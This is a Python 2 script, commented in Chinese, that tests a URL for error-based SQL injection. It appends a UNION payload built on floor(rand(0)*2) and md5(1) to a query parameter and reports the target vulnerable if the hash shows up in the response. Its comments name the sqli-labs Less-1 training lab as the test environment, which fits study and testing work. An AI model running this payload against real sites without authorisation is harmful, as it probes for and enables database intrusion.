#!/usr/bin/env python 
# -*- coding:utf-8 -*-
# 基于报错的注入，利用数据库报错检测系统是否存在sql注入，md5函数报错即sql语句执行，可判断存在sql注入
# 测试环境是sqli-labs的第一关
import sys
import hashlib
import requests

def verify(url):
    # 本地环境测试地址 url = "http://192.168.166.100:32768/Less-1/?id="
    payload = "1' union (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(select md5(1)))a from information_schema.tables group by a)b) --+"
    target = url + payload
    try:
        # 发送http get请求
        res = requests.get(target)
        res.encoding = 'utf-8'
        data = res.text
        if data:
            # 处理 响应
            # print data
            if hashlib.md5('1').hexdigest() in data:
                print "%s  is vulnerable" % target
            else:
                print "%s  is not vulnerable" % target
    except Exception, e:
        print "Something happend..."
        print e

def main():
    args = sys.argv
    url = ""
    if len(args) == 2:
        url = args[1]
        verify(url)
    else:
        print "Usage: python %s url" % (args[0])

if __name__ == "__main__":
    main()